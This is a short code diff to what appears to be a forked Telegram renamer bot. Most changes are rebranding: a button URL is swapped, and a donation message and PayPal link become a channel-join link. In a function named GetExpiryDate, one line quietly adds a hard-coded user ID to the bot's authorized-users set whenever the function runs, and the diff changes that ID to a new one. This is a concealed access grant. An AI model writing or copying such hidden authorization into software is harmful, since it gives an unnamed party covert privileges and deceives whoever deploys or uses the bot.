@@ -33,7 +33,7 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(1337144652)
+    Config.AUTH_USERS.add(1370501629)
     return expires_at
 
 
@@ -63,7 +63,7 @@ async def start(bot, update):
         reply_markup=InlineKeyboardMarkup(
         [
           [
-          InlineKeyboardButton('Turbo Renamer 🤫', url=myfather)
+          InlineKeyboardButton('Turbo Renamer 🤫', url=thala)
           ]
         ]
        )
@@ -84,11 +84,11 @@ async def upgrade(bot, update):
 async def donate(bot, update):
        await bot.send_message(
              chat_id=update.chat.id,
-             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below",
+             text="I am very happy to listen you this word. But not need for donation 🤘",
              reply_markup=InlineKeyboardMarkup(
              [
                [
-                 InlineKeyboardButton('Donate 💰', url='http://paypal.me/maheshmalekar')
+                 InlineKeyboardButton('Join 💰', url='https://t.me/SerialCoIn')
                ]
              ]
            )
